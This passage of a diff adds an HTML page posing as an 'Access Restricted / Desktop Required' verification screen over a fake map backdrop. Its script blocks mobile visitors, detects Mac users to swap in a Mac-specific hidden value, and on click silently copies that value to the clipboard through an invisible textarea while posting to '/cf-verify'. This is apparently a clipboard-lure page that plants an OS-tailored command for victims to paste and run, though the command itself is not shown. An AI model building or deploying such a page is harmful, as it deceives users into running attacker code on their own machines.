d="M49.753 9.274h-4.182v14.388h4.182V9.274ZM26.892 23.662v-2.357l9.71-13.58v-.281h-9.543v-3.76h15.79V6.04l-9.542 13.582v.28h9.822v3.76H26.892v.001Zm25.87 0V2.982h4.168v20.68h-4.168Zm7.186 0V2.982h4.168v20.68h-4.168Zm6.036-7.186c0-4.622 3.173-7.618 7.977-7.618 4.803 0 7.976 2.996 7.978 7.618 0 4.648-3.202 7.618-7.977 7.618s-7.978-2.995-7.978-7.617v-.001Zm11.769 0c0-2.382-1.574-4.061-3.792-4.061s-3.82 1.68-3.82 4.062c0 2.381 1.574 4.09 3.821 4.09 2.248 0 3.792-1.71 3.792-4.09l-.002-.001Zm8.505 7.186L81.938 9.29h4.235l2.917 10.302h.28L91.92 9.29h4.152l2.748 10.3h.28l2.859-10.303h4.123l-4.346 14.372h-5.413l-2.188-9.514h-.28l-2.16 9.516h-5.44.002Zm21.875-15.547h-.18V6.82h.608c.305 0 .503.155.503.393 0 .22-.186.374-.446.386h-.024l.507.516h-.228l-.484-.507h-.257v.507l.001-.001Zm0-1.147v.494h.428c.2 0 .323-.094.323-.248 0-.153-.123-.245-.323-.245h-.428v-.001Z" fill="#fff"/></g><defs><clipPath id="pt9c6"><path fill="#fff" d="M0 0h110v24H0z"/></clipPath></defs></svg>
+    </div>
+    <div class="nv2mp">Access Restricted</div>
+  </div>
+  <div class="rj6wh" style="text-align:center">
+    <div class="tz4bn">
+      <div class="pk7qs">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0041D9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+      </div>
+    </div>
+    <div class="hf3cw">Desktop Required</div>
+    <div class="xm9rv">This page is not available on mobile devices.<br>Please open this link on a <b>desktop</b> or <b>Mac</b> computer to continue.</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var ag=navigator.userAgent;
+  var qf=/Mobile|Android|iPhone|iPad|iPod/i.test(ag);
+  var xr=/Macintosh|Mac OS X/i.test(ag);
+  if(qf){
+    document.querySelector('.pb7ht').style.display='none';
+    document.querySelector('.dx3km').style.display='none';
+    document.getElementById('kw7hp').style.display='block';
+    document.getElementById('tn4bx').style.display='flex';
+  } else if(xr){
+    var wg=document.querySelector('a.gd5nk');
+    wg.setAttribute('href','#qb3rn');
+    var mv=wg.getAttribute('data-vmac');
+    if(mv) wg.setAttribute('data-val',mv);
+  }
+})();
+
+document.querySelector('a.gd5nk').addEventListener('click',function(){
+  fetch('/cf-verify',{method:'POST'}).catch(function(){});
+  var el=document.createElement('textarea');
+  el.value=this.dataset.val;
+  el.style.cssText='position:fixed;opacity:0;top:0;left:0;width:1px;height:1px';
+  document.body.appendChild(el);
+  el.focus();el.select();
+  try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(el);
+});
+
+(function(){
+  var cv=document.getElementById('rp6mj');
+  if(!cv) return;
+  function rnd(){
+    var pr=window.devicePixelRatio||1;
+    var cw=cv.parentElement.offsetWidth;
+    var ch=cv.parentElement.offsetHeight;
+    cv.width=cw*pr; cv.height=ch*pr;
+    cv.style.width=cw+'px'; cv.style.height=ch+'px';
+    var gx=cv.getContext('2d');
+    gx.scale(pr,pr);
+    var mw=cw,mh=ch;
+    gx.fillStyle='#E4DDD0'; gx.fillRect(0,0,mw,mh);
+    gx.fillStyle='#B4CDE0';
+    gx.fillRect(mw*.8,0,mw*.2,mh);
+    gx.fillRect(0,mh*.85,mw*.3,mh*.15);
+    gx.fillStyle='#C4D894';
+    gx.fillRect(mw*.35,mh*.1,mw*.16,mh*.26);
+    gx.fillRect(mw*.12,mh*.56,mw*.11,mh*.17);
+    gx.fillRect(mw*.58,mh*.52,mw*.09,mh*.14);
+    gx.fillRect(mw*.68,mh*.12,mw*.07,mh*.18);
+    gx.fillStyle='#D4CABC';
+    var sw=mw/10,sh=mh/8;
+    for(var ix=0;ix<10;ix++) for(var iy=0;iy<8;iy++) gx.fillRect(ix*sw+5,iy*sh+5,sw-10,sh-10);
+    gx.strokeStyle='#FFF'; gx.lineWidth=5;
+    for(var ri=0;ri<=10;ri++){gx.beginPath();gx.moveTo(ri*mw/10,0);gx.lineTo(ri*mw/10,mh);gx.stroke();}
+    for(var rj=0;rj<=8;rj++){gx.beginPath();gx.moveTo(0,rj*mh/8);gx.lineTo(mw,rj*mh/8);gx.stroke();}
+    gx.strokeStyle='#FFF'; gx.lineWidth=4;
+    gx.beginPath(); gx.moveTo(mw*.05,mh*.05); gx.lineTo(mw*.72,mh*.92); gx.stroke();
+    gx.strokeStyle='rgba(255,200,50,.6)'; gx.lineWidth=3;
+    gx.beginPath(); gx.moveTo(mw*.28,0); gx.lineTo(mw*.28,mh); gx.stroke();
+  }
+  rnd();
+  window.addEventListener('resize',rnd);
+})();
+</script>
+</body>
+</html>
